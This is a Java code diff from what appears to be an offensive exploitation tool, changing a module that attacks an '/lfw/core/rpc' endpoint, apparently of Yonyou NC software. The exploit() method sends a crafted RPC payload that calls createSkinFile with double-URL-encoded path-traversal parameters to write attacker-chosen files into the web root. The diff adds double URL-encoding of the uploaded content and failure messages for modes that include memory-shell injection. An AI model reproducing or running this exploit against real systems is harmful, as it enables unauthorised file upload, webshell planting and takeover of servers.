@@ -4,10 +4,13 @@ import com.chave.bean.Config;
 import com.chave.proxy.HttpProxy;
 import com.chave.utils.HttpUtil;
 import com.chave.utils.SSLUtil;
+import com.chave.utils.Util;
 import javafx.scene.control.TextArea;
 
+import java.io.UnsupportedEncodingException;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.net.URLEncoder;
 
 public class Lfw_Core_Rpc_Upload extends VulnBase {
     public static boolean DNSLOG = false;
@@ -24,7 +27,7 @@ public class Lfw_Core_Rpc_Upload extends VulnBase {
     }
 
     @Override
-    public void exploit() {
+    public void exploit() throws UnsupportedEncodingException {
 
         // 漏洞接口
         String vulnerable_url = Config.TARGET + "/lfw/core/rpc";
@@ -49,7 +52,8 @@ public class Lfw_Core_Rpc_Upload extends VulnBase {
         } else if (Config.MOD.equals("upload")) {
             filename = Config.FILENAME;
             data_base = "setdebugmode=2&&rpcdata={\"rpcname\":\"nc.uap.portal.service.itf.IPortalSpecService\",\"method\":\"createSkinFile\",\"params0\":\"webapps%25%32%66nc_web%25%32%66\",\"params1\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params2\":\"%25%32%65%25%32%65%25%32%66\",\"params3\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params4\":\"" + filename + "\",\"params5\":\"";
-            postData = data_base + Config.FILETEXT + "\"}";
+            // 文件内容需要经过两次url编码
+            postData = data_base + Util.fullyURLEncode(Util.fullyURLEncode(Config.FILETEXT)) + "\"}";
         }
 
         // 设置全局http代理
@@ -116,8 +120,16 @@ public class Lfw_Core_Rpc_Upload extends VulnBase {
                 }
 
             } else {
-                logMessage("[-] Lfw_Core_Rpc 文件上传失败, 请尝试手动验证漏洞.");
-                return;
+                if (Config.MOD.equals("poc")) {
+                    logMessage("[-] Lfw_Core_Rpc 文件上传失败, 请尝试手动验证漏洞.");
+                    return;
+                } else if (Config.MOD.equals("exp")) {
+                    logMessage("[-] 内存马注入失败, 请手动验证漏洞.");
+                    return;
+                } else if (Config.MOD.equals("upload")) {
+                    logUpload("[-] 文件上传失败, 请手动验证漏洞.");
+                    return;
+                }
             }
             conn1.disconnect();
         } catch (Exception e) {
